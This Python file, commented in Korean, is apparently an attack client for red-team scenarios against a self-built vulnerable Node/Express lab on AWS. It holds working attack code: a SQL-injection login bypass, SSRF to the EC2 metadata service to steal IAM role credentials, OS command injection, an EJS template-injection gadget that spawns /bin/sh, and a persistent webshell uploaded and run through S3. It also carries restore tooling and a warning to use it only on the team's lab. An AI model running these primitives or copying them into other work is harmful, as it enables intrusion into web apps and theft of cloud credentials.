"""
세 시나리오가 공유하는 웹앱 공격 클라이언트.

whs4namu.click(WHS-Cloud9-Vuln-Web, Node/Express) 침투 프리미티브만 담는다.
AWS 쪽 단계는 각 시나리오 파일에서 처리한다.

설계 원칙
  - 직선 실행. 환경이 세팅됐다고 가정하고 분기 없이 끝까지 간다.
  - fail-fast. 예상 밖 결과는 삼키지 않고 즉시 종료하되 어디서 멈췄는지는 남긴다.
  - 예상된 차단은 산출물. 정책 Deny 는 버그가 아니라 CloudTrail 증거이므로
    aws(..., expect=(DENY,)) 로 명시해 통과시킨다.
  - 복구 자료는 동작 전에 저장. save_recovery() 가 쓰고 되읽어 검증하며,
    실패하면 파괴적 동작을 시작하지 않는다.

대상 환경은 팀이 직접 세운 실습용이다. 운영 계정이나 타인 데이터에 쓰지 말 것.
"""

from __future__ import annotations

import datetime as dt
import json
import logging
import os
import re
import sys
import time
from pathlib import Path

import requests


HERE = Path(__file__).resolve().parent
PAYLOAD_DIR = HERE / "payloads"


# ─────────────────────────────────────────────────────────────
# .env 로더 (python-dotenv 없이 동작)
# ─────────────────────────────────────────────────────────────
def load_env(scenario_dir: str | Path) -> dict:
    """
    <scenario_dir>/.env 를 읽어 dict로 반환하고 os.environ에도 주입한다(없는 키만).
    형식: KEY=VALUE, '#' 주석과 빈 줄 무시, 값의 양끝 따옴표 제거.
    파일이 없으면 빈 dict.
    """
    env_path = Path(scenario_dir) / ".env"
    data: dict[str, str] = {}
    if not env_path.exists():
        return data
    for line in env_path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, _, val = line.partition("=")
        key = key.strip()
        val = val.strip().strip('"').strip("'")
        if not val:
            # 빈 값은 미설정으로 본다. "" 를 넣으면 env() 가 default 대신 그걸 돌려준다.
            continue
        data[key] = val
        os.environ.setdefault(key, val)
    return data


def env(name: str, default: str | None = None) -> str | None:
    """설정값 조회. 빈 문자열/공백은 '미설정'으로 보고 default 를 돌려준다."""
    val = os.environ.get(name)
    return val if val and val.strip() else default


def need_env(name: str) -> str:
    """필수 설정값. 없거나 비어 있으면 즉시 종료(fail-fast)."""
    val = env(name)
    if not val:
        raise SystemExit(f"[!] 중단: .env 에 {name} 를 설정하세요.")
    return val


def mask(secret: str | None, keep: int = 4) -> str:
    """민감값을 로그에 남길 때 앞 keep자만 노출."""
    if not secret:
        return "<none>"
    if len(secret) <= keep:
        return "*" * len(secret)
    return secret[:keep] + "…" + f"({len(secret)}자)"


# ─────────────────────────────────────────────────────────────
# 로거
# ─────────────────────────────────────────────────────────────
def get_logger(scenario_dir: str | Path, name: str) -> logging.Logger:
    """콘솔 + <scenario_dir>/<name>.log 동시 출력 로거."""
    log = logging.getLogger(name)
    if log.handlers:
        return log
    log.setLevel(logging.INFO)
    fmt = logging.Formatter("[%(asctime)s] %(levelname)-5s %(message)s", "%H:%M:%S")

    # 로그 메시지에 '—' '→' 같은 문자가 많다. Windows 에서 출력을 파이프하면
    # stdout 이 콘솔 코드페이지(cp949)로 잡혀 UnicodeEncodeError 로 죽는다.
    # (파일 핸들러는 encoding="utf-8" 이라 영향 없음)
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, OSError):
        pass

    sh = logging.StreamHandler(stream=sys.stdout)
    sh.setFormatter(fmt)
    log.addHandler(sh)

    fh = logging.FileHandler(Path(scenario_dir) / f"{name}.log", encoding="utf-8")
    fh.setFormatter(fmt)
    log.addHandler(fh)
    return log


def banner(log: logging.Logger, title: str, subtitle: str = ""):
    log.info("=" * 64)
    log.info("  %s", title)
    if subtitle:
        log.info("  %s", subtitle)
    log.info("=" * 64)


# ─────────────────────────────────────────────────────────────
# AWS 호출 fail-fast 래퍼 (CHANGES.md 3-1)
# ─────────────────────────────────────────────────────────────
#: Deny 계열 전체를 예상된 차단으로 통과시키는 sentinel.
#: 서비스마다 표기가 달라서(AccessDeniedException, UnauthorizedOperation …)
#: 코드 하나만 적으면 놓친다.
DENY = "__DENY_FAMILY__"

_DENY_CODES = frozenset({
    "AccessDenied",
    "AccessDeniedException",
    "UnauthorizedOperation",
    "AuthorizationError",
    "AuthFailure",
    "Forbidden",
    "NotAuthorized",
})


def err_code(e: Exception) -> str:
    """boto3 ClientError 등에서 에러 코드만 추출. 아니면 예외 클래스명."""
    resp = getattr(e, "response", None)
    if isinstance(resp, dict):
        code = resp.get("Error", {}).get("Code")
        if code:
            return str(code)
    return type(e).__name__


def err_str(e: Exception) -> str:
    """로그용 간결 표현 — 'Code: Message' 또는 'ExcName: str(e)'."""
    resp = getattr(e, "response", None)
    if isinstance(resp, dict):
        err = resp.get("Error", {})
        code, msg = err.get("Code", ""), err.get("Message", "")
        if code:
            return f"{code}: {msg}" if msg else str(code)
    return f"{type(e).__name__}: {e}"


def is_denied(code: str) -> bool:
    """정책/권한경계 Deny 계열인지. 접두 매칭으로 서비스별 변종까지 흡수."""
    return code in _DENY_CODES or code.startswith("AccessDenied")


def aws(log: logging.Logger, label: str, fn, *args,
        expect: tuple[str, ...] = (), **kwargs):
    """
    AWS 호출 래퍼.

    expect 에 든 에러코드(또는 DENY sentinel에 해당하는 Deny 계열)만
    '예상된 차단'으로 로깅하고 None 을 반환한다. 그 외 예외는 즉시 종료.

        aws(LOG, "iam:ListUsers", iam.list_users, expect=(DENY,))   # 차단돼도 계속
        out = aws(LOG, "s3:ListBuckets", s3.list_buckets)           # 예상 밖이면 종료
    """
    try:
        return fn(*args, **kwargs)
    except Exception as e:
        code = err_code(e)
        if code in expect or (DENY in expect and is_denied(code)):
            log.info("  [expected] %s → %s (예상된 차단 — CloudTrail 증거 확보)",
                     label, code)
            return None
        log.error("  [FAIL] %s → %s", label, err_str(e))
        raise SystemExit(f"[!] 중단: {label} 에서 예상치 못한 결과")


# ─────────────────────────────────────────────────────────────
# 복구 자료 저장 (CHANGES.md 4-1 B — 사용자 요청 1번)
# ─────────────────────────────────────────────────────────────
def save_recovery(scenario_dir: str | Path, name: str, data: bytes,
                  meta: dict | None = None) -> Path:
    """
    복구 자료(암호화 키, 대상 목록 등)를 <scenario_dir>/recovery/ 에 저장한다.
    파괴적 동작을 시작하기 전에 호출한다.

    저장 후 되읽어 바이트 비교하므로 정상 반환했다면 파일이 확실히 있다.
    실패하면 예외를 던져 호출부가 진행하지 못하게 한다.
    meta 를 주면 <name>.meta.json 으로 함께 남긴다.
    """
    d = Path(scenario_dir) / "recovery"
    d.mkdir(parents=True, exist_ok=True)
    path = d / name

    path.write_bytes(data)
    try:
        os.chmod(path, 0o600)  # POSIX에서만 의미 있음. Windows에선 무시됨.
    except OSError:
        pass

    # 저장 검증 — 여기까지 통과해야 "복구 가능"이라고 말할 수 있다.
    if path.read_bytes() != data:
        raise RuntimeError(f"복구 자료 저장 검증 실패(내용 불일치): {path}")

    if meta:
        meta_path = d / f"{name}.meta.json"
        meta_path.write_text(json.dumps(meta, indent=2, ensure_ascii=False),
                            encoding="utf-8")
        if not meta_path.exists():
            raise RuntimeError(f"복구 메타 저장 실패: {meta_path}")
    return path


def delete_uploaded_objects(log: logging.Logger, scenario_dir: str | Path,
                            bucket: str) -> None:
    """
    recovery/uploaded_objects.json 에 기록된 S3 업로드 객체를 지운다.

    올린 파일은 지우기 전까지 실행 가능한 웹셸로 남는다. 공격 경로로는 못 지운다 —
    EC2 역할에도 공격용 장기키에도 s3:DeleteObject 가 없다. 그래서 .env 의
    RESTORE_AWS_* (실습 운영자 계정)로 지운다. 공격 단계는 이 키를 쓰지 않는다.
    """
    import boto3

    path = Path(scenario_dir) / "recovery" / "uploaded_objects.json"
    if not path.exists():
        log.info("  업로드 기록이 없다 — 지울 것이 없음 (%s)", path)
        return
    keys = json.loads(path.read_text(encoding="utf-8")).get("keys", [])
    if not keys:
        log.info("  기록에 key 가 없다 — 지울 것이 없음")
        return

    s3 = boto3.Session(
        aws_access_key_id=need_env("RESTORE_AWS_ACCESS_KEY_ID"),
        aws_secret_access_key=need_env("RESTORE_AWS_SECRET_ACCESS_KEY"),
        region_name=env("RESTORE_AWS_REGION", "ap-northeast-2"),
    ).client("s3")
    log.info("  [+] 복구 전용 자격증명 사용 (RESTORE_AWS_* — 공격 경로 아님)")
    log.info("  [+] 대상 %d개 (버킷 %s)", len(keys), bucket)

    gone = []
    for key in keys:
        try:
            s3.delete_object(Bucket=bucket, Key=key)
        except Exception as e:
            log.warning("  [FAIL] %s → %s", key, err_str(e))
            continue
        # 정말 사라졌는지 확인한다. delete_object 는 없는 key 에도 204 를 준다.
        try:
            s3.head_object(Bucket=bucket, Key=key)
        except Exception:
            gone.append(key)
            log.info("  [+] 삭제: %s", key.rsplit("--", 1)[-1])
            continue
        log.warning("  [!] 삭제했는데 아직 조회된다: %s", key)

    log.info("  [=] 삭제 %d/%d", len(gone), len(keys))
    if len(gone) == len(keys):
        path.write_text(json.dumps(
            {"keys": [], "count": 0, "note": "--restore 로 전부 삭제됨",
             "at_utc": dt.datetime.now(dt.timezone.utc).isoformat()},
            indent=2, ensure_ascii=False), encoding="utf-8")
        log.info("      기록 초기화: recovery/uploaded_objects.json")
    else:
        log.warning("      일부가 남았다. 기록은 그대로 두니 다시 시도할 것.")


# ─────────────────────────────────────────────────────────────
# 미복구 상태 가드
# ─────────────────────────────────────────────────────────────
def pending_recovery(scenario_dir: str | Path, name: str,
                     list_field: str | None = None) -> bool:
    """
    recovery/<name> 이 '아직 되돌리지 않은 상태'를 나타내는지 판정한다.

    list_field 를 주면 그 배열이 비어 있지 않을 때만 미복구로 본다.
    없으면 파일이 존재하는 것 자체를 미복구로 본다.
    읽을 수 없으면 보수적으로 미복구로 취급한다.
    """
    path = Path(scenario_dir) / "recovery" / name
    if not path.exists():
        return False
    if list_field is None:
        return True
    try:
        return bool(json.loads(path.read_text(encoding="utf-8")).get(list_field))
    except (ValueError, OSError):
        return True


def require_restored(log: logging.Logger, scenario_dir: str | Path,
                     restore_cmd: str,
                     items: list[tuple[str, str | None, str]]) -> None:
    """
    이전 실행을 되돌리지 않았으면 새 공격 실행을 거부한다.

    되돌리지 않은 채로 다시 공격하면 복구 자료(SSE-C 키, GuardDuty 이전 상태 등)를
    덮어써서 **원래 상태로 못 돌아가는** 사고가 난다. 그래서 진입 시점에 막는다.

    items: (파일명, list_field 또는 None, 사람이 읽을 설명) 목록.
    """
    stuck = [(n, desc) for n, field, desc in items
             if pending_recovery(scenario_dir, n, field)]
    if not stuck:
        return
    log.error("[!] 이전 실행이 아직 복구되지 않았다:")
    for name, desc in stuck:
        log.error("      - %s  (recovery/%s)", desc, name)
    log.error("    먼저 복구를 끝내고 다시 실행할 것:  %s", restore_cmd)
    raise SystemExit(
        "[!] 중단: 미복구 상태에서 재실행하면 복구 자료를 덮어써 되돌릴 수 없게 된다.")


def clear_recovery(scenario_dir: str | Path, name: str,
                   list_field: str | None = None) -> None:
    """
    복구가 끝난 기록을 '되돌림' 상태로 만든다.

    list_field 가 있으면 그 배열만 비우고 감사용으로 파일은 남긴다.
    없으면 파일을 지운다(존재 자체가 미복구 신호이므로).
    """
    path = Path(scenario_dir) / "recovery" / name
    if not path.exists():
        return
    if list_field is None:
        path.unlink()
        return
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (ValueError, OSError):
        data = {}
    data[list_field] = []
    data["restored_utc"] = dt.datetime.now(dt.timezone.utc).isoformat()
    path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")


def load_recovery(scenario_dir: str | Path, name: str) -> bytes:
    """save_recovery 로 저장한 자료를 읽는다. 없으면 즉시 종료(fail-fast)."""
    path = Path(scenario_dir) / "recovery" / name
    if not path.exists():
        raise SystemExit(f"[!] 중단: 복구 자료가 없습니다 — {path}")
    return path.read_bytes()


# ─────────────────────────────────────────────────────────────
# payload 로더 (CHANGES.md 3-3)
# ─────────────────────────────────────────────────────────────
def load_payload(payload_name: str) -> bytes:
    """
    payloads/<payload_name> 을 바이트로 읽는다. 없으면 즉시 종료.

    스크립트를 파일로 분리해 두면 payloads/README.md 에 MITRE 기법과 함께
    문서화할 수 있고, 시나리오 파일에는 흐름만 남는다.
    """
    path = PAYLOAD_DIR / payload_name
    if not path.exists():
        raise SystemExit(f"[!] 중단: payload 파일이 없습니다 — {path}")
    # Windows 에서 편집하면 CRLF 로 저장되는데, 그대로 올리면 대상 셸이
    # `$'\r': command not found` / `syntax error near unexpected token $'in\r'`
    # 로 깨진다. 디스크 상태와 무관하게 업로드 직전에 LF 로 normalize 한다.
    return path.read_bytes().replace(b"\r\n", b"\n")


def render_payload(payload_name: str, **subst: str) -> bytes:
    """
    payload 를 읽고 `@@NAME@@` 자리표시자를 치환한다.
    치환되지 않은 자리표시자가 남으면 즉시 종료(오타로 빈 값이 들어가는 사고 방지).
    """
    text = load_payload(payload_name).decode("utf-8")
    for k, v in subst.items():
        text = text.replace(f"@@{k}@@", v)
    left = re.findall(r"@@[A-Z0-9_]+@@", text)
    if left:
        raise SystemExit(f"[!] 중단: {payload_name} 의 자리표시자 미치환 — {sorted(set(left))}")
    return text.encode("utf-8")


# ─────────────────────────────────────────────────────────────
# 웹앱 클라이언트
# ─────────────────────────────────────────────────────────────
class WhsClientError(RuntimeError):
    pass


class WhsClient:
    """WHS-Cloud9-Vuln-Web 대상 공격 프리미티브 모음."""

    # non-GET 요청에 필수인 CSRF 방어 우회 헤더 (server.js: X-WHS-Request !== '1' → 403)
    CSRF_HEADER = {"X-WHS-Request": "1"}

    def __init__(self, base_url: str, log: logging.Logger, verify_ssl: bool = True,
                 timeout: int = 30, recovery_dir: str | Path | None = None):
        self.base = base_url.rstrip("/")
        self.log = log
        self.timeout = timeout
        self.s = requests.Session()
        self.s.verify = verify_ssl
        self.user = None  # 로그인 후 {id,name,email,...}
        self.target_host = None  # pin_target() 으로 고정한 대상 인스턴스 hostname
        # 업로드한 S3 key 전부. 정리하려면 이 목록이 있어야 한다.
        self.uploaded_keys: list[str] = []
        self.recovery_dir = Path(recovery_dir) if recovery_dir else None
        # 이전 실행 기록이 있으면 이어받는다. 실행마다 덮어쓰면 앞선 실행이
        # 올린 객체가 목록에서 사라져 정리 대상에서 누락된다.
        if self.recovery_dir:
            prev = self.recovery_dir / "recovery" / "uploaded_objects.json"
            if prev.exists():
                try:
                    self.uploaded_keys = json.loads(
                        prev.read_text(encoding="utf-8")).get("keys", [])
                except (ValueError, OSError):
                    pass

    # ── 내부 요청 헬퍼 ────────────────────────────────────────
    def _post(self, path: str, json_body=None, files=None, extra_headers=None,
              retry_429: int = 5) -> requests.Response:
        headers = dict(self.CSRF_HEADER)
        if extra_headers:
            headers.update(extra_headers)
        url = self.base + path
        for attempt in range(retry_429):
            r = self.s.post(url, json=json_body, files=files, headers=headers,
                            timeout=self.timeout)
            if r.status_code == 429:  # 서버가 실습 동시 실행 1개로 제한
                self.log.debug("  429 (동시 실행 제한) — 재시도 %d", attempt + 1)
                time.sleep(2)
                continue
            return r
        raise WhsClientError(f"429 반복: {path}")

    def _json(self, r: requests.Response, what: str) -> dict:
        """응답 JSON 파싱. 실패하면 예외(fail-fast)."""
        try:
            return r.json()
        except ValueError:
            raise WhsClientError(f"{what} 응답 JSON 아님 {r.status_code}: {r.text[:200]}")

    # ── 로그인 ────────────────────────────────────────────────
    def login_normal(self, email: str, password: str) -> dict:
        """정상 계정 로그인. 세션 쿠키(connect.sid) 확보."""
        r = self._post("/api/login", {"email": email, "password": password})
        if r.status_code != 200:
            raise WhsClientError(f"정상 로그인 실패 {r.status_code}: {r.text[:200]}")
        self.user = self._json(r, "login").get("user") or {}
        self.log.info("[auth] 정상 로그인 성공 — user=%s (%s)",
                      self.user.get("email"), self.user.get("id"))
        return self.user

    def login_sqli(self, email_payload: str = "' OR '1'='1' -- ",
                   password: str = "whatever_ignored") -> dict:
        """
        SQLi 인증 우회. login.js:
          SELECT * FROM users WHERE email = '<payload>' AND password_hash='<sha256(pw)>' LIMIT 1
        email에 페이로드를 넣어 password 조건을 주석 처리 → 첫 사용자 행 반환.
        """
        self.log.info("[auth] SQLi 인증 우회 시도 — payload=%r", email_payload)
        r = self._post("/api/login", {"email": email_payload, "password": password})
        if r.status_code != 200:
            raise WhsClientError(
                f"SQLi 로그인 실패 {r.status_code}: {r.text[:200]} "
                f"(users 테이블이 비었거나 WAF BLOCK일 수 있음)")
        self.user = self._json(r, "login").get("user") or {}
        self.log.info("[auth] SQLi 우회 성공 — 탈취 세션 user=%s (%s)",
                      self.user.get("email"), self.user.get("id"))
        return self.user

    # ── SSRF ──────────────────────────────────────────────────
    def ssrf(self, url: str) -> dict:
        """
        POST /api/images/preview {url}. 대상 응답을 서버가 대신 가져와 반환.
        반환 dict: {status, contentType, fetchedUrl, image?|text?}
        이미지가 아니면 text 필드에 원문 16000자.
        """
        return self._json(self._post("/api/images/preview", {"url": url}), "SSRF")

    def imds(self, path: str, base: str = "http://169.254.169.254") -> str:
        """
        SSRF 경유로 IMDSv1 경로 조회. text 필드(원문) 반환.
        text 가 없으면(= SSRF가 값을 못 가져옴) 예외 — 빈 문자열로 계속 가지 않는다.
        """
        res = self.ssrf(base + path)
        text = res.get("text")
        if text is None:
            raise WhsClientError(
                f"IMDS 조회 실패 {path}: {json.dumps(res, ensure_ascii=False)[:200]}")
        return text

    # ── OS 커맨드 인젝션 ──────────────────────────────────────
    def os_command(self, injection: str) -> dict:
        """
        POST /api/labs/os-command {input}. command-lab.js:
          /bin/sh -c "printf '%s\\n' <input>"
        input에 셸 메타문자를 넣어 임의 명령 실행. 제한: 200자/8초/32KB.
        반환: {stdout, stderr, exitCode} 또는 {error}
        """
        if len(injection) > 200:
            raise WhsClientError(
                f"os-command input 200자 초과(len={len(injection)}) — "
                f"서버가 400 거부한다. 긴 스크립트는 upload/execute 경로를 쓸 것.")
        return self._json(self._post("/api/labs/os-command", {"input": injection}),
                          "os-command")

    #: printf 가 소비하는 첫 인자. shell() 이 출력에서 이 한 줄만 제거한다.
    _SENTINEL = "x"

    def shell(self, cmd: str) -> str:
        """
        os_command로 임의 셸 명령을 실행하고 stdout+stderr 합본을 반환.
        페이로드는 `x; <cmd>` 형태 (printf의 첫 인자 x를 소비시키고 명령 분리).
        실패 시 예외(fail-fast) — '<error:...>' 문자열을 반환하지 않는다.
        """
        res = self.os_command(f"{self._SENTINEL}; {cmd}")
        if "stdout" not in res:
            raise WhsClientError(f"os-command 실행 실패: {res.get('error', res)}")
        out = (res.get("stdout", "") + res.get("stderr", ""))

        # 첫 줄이 정확히 sentinel 일 때만 버린다.
        # startswith 로 자르면 출력이 x 로 시작할 때(hostname 등) 글자가 날아간다.
        lines = out.split("\n")
        if lines and lines[0].strip() == self._SENTINEL:
            lines = lines[1:]
        return "\n".join(lines).strip()

    # ── SSTI (EJS) ────────────────────────────────────────────
    def ssti(self, template: str) -> dict:
        """
        POST /api/labs/ssti {template}. server.js: ejs.render(template, {name}).
        반환: {result} 또는 {error}
        """
        return self._json(self._post("/api/labs/ssti", {"template": template}), "ssti")

    #: SSTI RCE 가젯. 대상 앱이 ESM 이라 require 와 process.mainModule 이 둘 다 없어서
    #: 흔히 쓰는 mainModule.require('child_process') 가 통하지 않는다.
    #: process.binding('spawn_sync') 는 deprecated 지만 Node 22 에서 아직 동작한다.
    #: execSync 와 달리 종료코드가 0이 아니어도 예외를 던지지 않아 셸 분기와도 잘 맞는다.
    _SPAWN_STDIO = ("[{type:'pipe',readable:true,writable:false},"
                    "{type:'pipe',readable:false,writable:true},"
                    "{type:'pipe',readable:false,writable:true}]")

    def ssti_exec(self, cmd: str) -> str:
        """SSTI 로 셸 명령을 실행하고 stdout+stderr 합본을 반환. 실패 시 예외."""
        tpl = (
            "<%= (function(r){return [r.output[1],r.output[2]]"
            ".map(function(b){return b?b.toString():''}).join('')})"
            "(process.binding('spawn_sync').spawn({file:'/bin/sh',"
            "args:['/bin/sh','-c'," + json.dumps(cmd) + "],"
            "stdio:" + self._SPAWN_STDIO + "})) %>"
        )
        res = self.ssti(tpl)
        if "result" not in res:
            raise WhsClientError(f"ssti 실행 실패: {res.get('error', res)}")
        return res["result"].strip()

    # ── 파일 업로드 → 실행 (웹셸) ─────────────────────────────
    def upload(self, filename: str, data: bytes,
               content_type: str = "application/octet-stream") -> str:
        """
        POST /api/files (multipart). files.js가 S3에 저장.
        반환: S3 key (whs-uploads/<userId>/<uuid>--<name>). 실행에는 .js/.py/.sh 확장자.
        """
        files = {"file": (filename, data, content_type)}
        r = self._post("/api/files", files=files)
        if r.status_code != 201:
            raise WhsClientError(f"업로드 실패 {r.status_code}: {r.text[:200]}")
        info = self._json(r, "upload")
        self.log.info("[upload] S3 저장됨 key=%s (executable=%s)",
                      info.get("key"), info.get("executable"))
        self._record_upload(info["key"])
        return info["key"]

    def _record_upload(self, key: str) -> None:
        """
        업로드한 S3 key 를 기록한다. 올린 객체는 지우기 전까지 실행 가능한 웹셸로
        남으므로, 어디에 뭘 올렸는지 모르면 정리를 못 한다.

        rce(via='upload') 는 호출할 때마다 임시 스크립트를 새로 올리고 key 를
        버리기 때문에, 시나리오 쪽에 맡기지 않고 여기서 모은다.
        중간에 죽어도 목록이 남도록 업로드할 때마다 디스크에 쓴다.
        """
        self.uploaded_keys.append(key)
        if self.recovery_dir is None:
            return
        save_recovery(
            self.recovery_dir, "uploaded_objects.json",
            json.dumps({"keys": self.uploaded_keys,
                        "count": len(self.uploaded_keys),
                        "at_utc": dt.datetime.now(dt.timezone.utc).isoformat(),
                        "cleanup": "aws s3 rm s3://<bucket>/<key>  (키마다 1회)"},
                       indent=2, ensure_ascii=False).encode())

    def upload_payload(self, payload_name: str, **subst: str) -> str:
        """
        payloads/<payload_name> 을 업로드하고 S3 key 를 반환한다.
        subst 를 주면 @@NAME@@ 자리표시자를 치환해서 올린다.
        """
        data = render_payload(payload_name, **subst) if subst else load_payload(payload_name)
        self.log.info("[payload] %s (%d bytes) 업로드", payload_name, len(data))
        return self.upload(payload_name, data)

    def execute(self, key: str) -> str:
        """
        POST /api/files/execute {key}. file-runner.js가 S3에서 받아 EC2에서 실행.
        업로드가 S3에 남으므로 어느 인스턴스에서든 재실행 가능 = stateless 웹셸.
        반환: stdout+stderr 합본. 실패 시 예외(fail-fast).
        """
        res = self._json(self._post("/api/files/execute", {"key": key}), "execute")
        if "stdout" not in res:
            raise WhsClientError(f"execute 실패 key={key}: {res.get('error', res)}")
        return (res.get("stdout", "") + res.get("stderr", "")).strip()

    def webshell(self, cmd: str, filename: str = "runner.sh") -> tuple[str, str]:
        """
        셸 명령을 담은 스크립트를 업로드→실행. (stdout, s3_key) 반환.
        s3_key를 보관해두면 execute(key)로 언제든 재실행 = 지속 웹셸.
        임시 명령용. 심어두는 페이로드는 upload_payload() 를 쓸 것.
        """
        key = self.upload(filename, f"#!/bin/sh\n{cmd}\n".encode())
        return (self.execute(key), key)

    # ── RCE 추상화 ────────────────────────────────────────────
    def rce(self, cmd: str, via: str = "os") -> str:
        """
        via: 'os'(OS 커맨드) | 'ssti'(EJS) | 'upload'(파일 실행)
        지정한 한 경로로 셸 명령을 실행하고 stdout을 반환. 실패 시 예외.
        """
        if via == "os":
            return self.shell(cmd)
        if via == "ssti":
            return self.ssti_exec(cmd)
        if via == "upload":
            return self.webshell(cmd)[0]
        raise ValueError(f"알 수 없는 RCE 경로: {via}")

    # ── 단일 인스턴스 고정 ────────────────────────────────────
    #: 대상이 아닌 인스턴스에 걸렸을 때 찍는 표식.
    MISS = "__MISS__"

    def pin_target(self, *, via: str = "os") -> str:
        """
        이후 모든 명령을 실행할 인스턴스 1대를 고정한다.

        ALB 가 라운드로빈이고 stickiness 도 꺼져 있어 요청마다 인스턴스가 바뀐다.
        단계별로 따로 요청하면 흔적이 양쪽에 흩어지므로, 처음 닿은 호스트를
        대상으로 잡고 on_target() / run_payload_on_target() 이 셸 가드를 씌운다.
        """
        out = self.rce("hostname", via=via).strip()
        host = out.splitlines()[0].strip() if out else ""
        if not host:
            raise WhsClientError(f"대상 인스턴스 hostname 을 얻지 못했다: {out[:200]!r}")
        self.target_host = host
        self.log.info("[pin] 대상 인스턴스 고정 — %s", host)
        self.log.info("      이후 모든 단계는 이 1대에서만 실행된다(다른 인스턴스 미접촉).")
        return host

    def short_host(self) -> str:
        """가드·payload 치환에 쓸 짧은 호스트명. ip-10-3-11-239.ap-… → ip-10-3-11-239"""
        if not self.target_host:
            raise WhsClientError("pin_target() 을 먼저 호출해야 한다.")
        return self.target_host.split(".")[0]

    def target_guard(self, cmd: str) -> str:
        """
        대상 인스턴스가 아니면 cmd 를 실행하지 않는 셸 가드로 감싼다.

        os-command 경로는 페이로드가 서버쪽 큰따옴표 안에 들어가서 $변수를 쓰면
        바깥 셸이 먼저 비워버린다. 그래서 변수 없이 $(hostname) 만 쓴다.

        패턴 뒤에 '.' 를 붙이는 게 중요하다. `ip-10-3-11-4*` 처럼 두면
        ip-10-3-11-45 같은 접두사 관계의 다른 인스턴스까지 매칭되어
        단일 대상 보장이 깨진다. FQDN 은 항상 짧은 이름 뒤에 '.' 가 온다.

        가드가 sentinel 포함 79자를 먹으므로 cmd 는 120자 안쪽이어야 한다.
        더 길면 업로드→실행 경로를 쓸 것.
        """
        return (f"hostname; case $(hostname) in {self.short_host()}.*) {cmd} ;; "
                f"*) echo {self.MISS} ;; esac")

    def on_target(self, cmd: str, *, via: str = "os", label: str = "cmd",
                  max_rounds: int = 24) -> str:
        """
        고정된 대상에서만 cmd 를 실행하고 stdout 을 반환한다.
        다른 인스턴스에 걸리면 아무것도 실행하지 않고 재시도한다.
        """
        guarded = self.target_guard(cmd)
        for _ in range(max_rounds):
            out = self.rce(guarded, via=via)
            body = "\n".join(out.split("\n")[1:]).strip()
            if body == self.MISS:
                time.sleep(0.3)
                continue
            return body
        raise WhsClientError(
            f"[pin] {label}: 대상 {self.target_host} 에 {max_rounds}회 내 도달 실패")

    def run_payload_on_target(self, key: str, *, label: str = "payload",
                              expect: str | None = None,
                              max_rounds: int = 24) -> str:
        """
        업로드된 payload(S3 key)를 대상 인스턴스에서만 실행한다.

        payload 스크립트가 스스로 대상을 확인하고 아니면 MISS 를 찍어야 한다
        (payloads/*.sh 의 @@TARGET@@ 가드). 여기서는 MISS 면 재시도만 한다.
        긴 스크립트는 os-command 200자 제한을 넘으므로 이 경로를 쓴다.

        expect 를 주면 출력에 그 문자열이 있어야 성공으로 본다. execute 는
        스크립트가 셸 오류로 죽어도 stdout/stderr 를 그대로 돌려주기 때문에,
        이 확인이 없으면 실패를 성공으로 보고하게 된다(실제로 겪음).
        """
        for _ in range(max_rounds):
            out = self.execute(key)
            body = "\n".join(out.split("\n")[1:]).strip()
            if self.MISS in body:
                time.sleep(0.3)
                continue
            if expect is not None and expect not in body:
                raise WhsClientError(
                    f"[payload] {label}: 기대 출력 {expect!r} 이 없다 — "
                    f"스크립트가 실패했을 가능성이 높다.\n    출력: {body[:300]}")
            return body
        raise WhsClientError(
            f"[pin] {label}: 대상 {self.target_host} 에 {max_rounds}회 내 도달 실패")


# ─────────────────────────────────────────────────────────────
# STS 임시 자격증명 파서 (IMDS 응답 → dict)
# ─────────────────────────────────────────────────────────────
def parse_imds_credentials(raw: str) -> dict:
    """
    IMDS security-credentials/<role> 응답(JSON 텍스트)에서 자격증명 추출.
    파싱 실패 시 예외(fail-fast) — None 을 돌려 호출부가 계속 가게 하지 않는다.
    """
    m = re.search(r'\{.*"AccessKeyId".*\}', raw or "", re.DOTALL)
    if not m:
        raise WhsClientError(f"IMDS 자격증명 JSON 미발견: {(raw or '')[:200]!r}")
    try:
        d = json.loads(m.group())
    except json.JSONDecodeError as e:
        raise WhsClientError(f"IMDS 자격증명 JSON 파싱 실패: {e}")
    missing = {"AccessKeyId", "SecretAccessKey", "Token"} - d.keys()
    if missing:
        raise WhsClientError(f"IMDS 자격증명 필드 누락: {sorted(missing)}")
    return {k: d[k] for k in
            ("AccessKeyId", "SecretAccessKey", "Token", "Expiration") if k in d}
